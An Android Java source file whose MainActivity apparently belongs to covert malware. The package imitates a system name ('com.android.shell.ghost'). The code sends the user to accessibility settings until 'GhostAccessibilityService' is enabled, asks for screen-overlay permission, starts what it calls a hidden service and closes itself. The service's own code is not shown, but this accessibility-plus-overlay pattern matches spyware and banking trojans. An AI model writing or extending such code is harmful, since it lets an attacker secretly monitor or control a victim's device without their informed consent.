package com.android.shell.ghost;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

public class MainActivity extends Activity {
    private void proceedIfReady() {
        String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabled != null && enabled.contains("GhostAccessibilityService")) {
            GhostAccessibilityService.startHiddenService(this);
            finish();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        proceedIfReady();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
        // Enable accessibility service if not already
        String enabled = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        String target = "GhostAccessibilityService";
        if (enabled == null || !enabled.contains(target)) {
            // Launch accessibility settings so the user can enable
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } else {
            // Start the foreground service and hide
            if (!Settings.canDrawOverlays(this)) {
                try { startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, android.net.Uri.parse("package:" + getPackageName()))); } catch (Exception ignored) {}
            }
            GhostAccessibilityService.startHiddenService(this);
            finish();
        }
    }
}